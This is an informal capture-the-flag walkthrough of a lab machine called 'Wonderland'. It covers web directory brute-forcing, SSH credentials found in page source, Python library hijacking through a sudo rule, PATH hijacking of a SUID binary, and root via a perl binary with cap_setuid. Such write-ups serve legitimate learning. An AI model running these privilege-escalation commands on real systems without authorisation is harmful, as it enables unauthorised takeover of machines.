### Wonderland

export ip =10.10.176.192

first i put the nmap and gobuster to execute, nmap found port 22 and 80 open and gobuster found just tree directorys in the http page.

/img
/poem
/r 

in img have tree images, a rabbit and the others are a alice opens an door.
in these alice imgs theres is some text at the bottom but i couldn't understand it.

i mean, looks like a soo much diferent letters at the same time.

the main page says "that alice was so much surprised,that for a moment she forgot how to speak good english" but my english and my vocabulary aren't good so this becomes a little bit more harder to me.

the /r directory has a small text that says "Would you tell me, please, which way I ought to go from here?" BRO I DONT KNOW FIND YOURSELF.

so,i tried so much different names in url directory but couldn't have a response, just 404  

after a while i has a big idea and i've put de gobuster to run in the /r directory and he found /a directory

and " "That depends a good deal on where you want to get to," said the Cat." is the content of the /r/a/ directory, this cat is very cool i love him and his smile 

but it doesn't matter now, i put the gobuster to execute again but now in the /r/a/ and he found /b directory, looks like the alfabeth but it isn't in order  

# Content: "I don’t much care where—" said Alice.

and gobuster found other /b directory inside /b directory, how confusing!

# Content: "Then it doesn’t matter which way you go," said the Cat. 

now gobuster found /i 

# Content: "—so long as I get somewhere,"" Alice added as an explanation.

all of these page has a "Keep going" in header so i mean that when i arrive in somewhere this will change

and the gobuster found /t and if you put all of these letter together, the result is:

"/r/a/b/b/i/t"  HAHAHAHAHA

and the header changes ! 

# Content: Open the door and enter wonderland

"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."

so, if i add hatter or marchhare in the url? nothing happens :)

view source of the page has "alice:How Doth The Little Crocodile Improve His Shining Tail"

i don't know what this mean 

i researched about this and i found some darker things about this history and the creator wtffff

i tried a much words about in the url that crocodile and your shining tail but i couldn't find anything 

ITS A LOGIN ABSDIOLUBASOIUBDPAIUSBDPIUBAWPUBEDAUSBDANWDÌNO 

alice@pass

its a login to ssh connection!

now i can login in the machine

i know where is the root flag but i don't have permission. 

alice can run /usr/bin/python3.6 walrus_and_the_carpenter.py as rabbit user

this code, imports random and print a random line from an poem,so what i do is 

$ touch random.py

$ nano random.py


'''
python3 -c 'import pty; pty.spawn("/bin/bash")'

'''

$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

$ nc -lvnp 9001

i'll find for suid aplications and if i don't got anything i'm going to search something in contrab


$ find / -perm -4000 2>/dev/null

'''

/home/rabbit/teaParty 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at 
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/sudo
/bin/fusermount
/bin/umount
/bin/ping
/bin/mount
/bin/su
$ 

'''

/home/rabbit/teaParty binary has suid, what this binary does?

let's go see with ida

this binary calls a system function with an command wich is "/bin/echo -n 'some text' && date --d"

the import thing here is date command, because the path is not correctly specified as in the echo command, then i'll manipule the path to get other user

$ mkdir /tmp/foo # create random directory to put the script

$ echo "/bin/sh" > /tmp/foo/date # create the script that will launch /bin/sh

$ chmod 777 /tmp/foo/date # mark it as executable

$ PATH=/tmp/foo:$PATH 

$ /home/rabbit/teaParty

$ whoami 
hatter

explanation from this blog: [blog](https://blog.creekorful.org/2020/09/setuid-privilege-escalation/)

'''
How does the PATH work exactly?

The PATH variable is used to lookup executables when issuing command. It is composed of directories to include while searching, separated by a semicolon ‘:'.

For example: /usr/local/bin:/usr/bin:/bin means that executables will be searched in the following directories:

    /usr/local/bin
    /usr/bin
    /bin

The search will stop when the executable is found. It means that if apt is present in /usr/local/bin/apt it will not be searched in the others directories.
'''

after a few time search something i decide use linpeas to enumerate for me and make the things more easy

linpeas found this

'''
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
'''

so,just what you need to do is,but first connect in the hatter account with ssh...In my case this perl command only worked in this way

$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
#whoami
root

#cat /home/alice/root.txt
#cat /root/user.txt

;)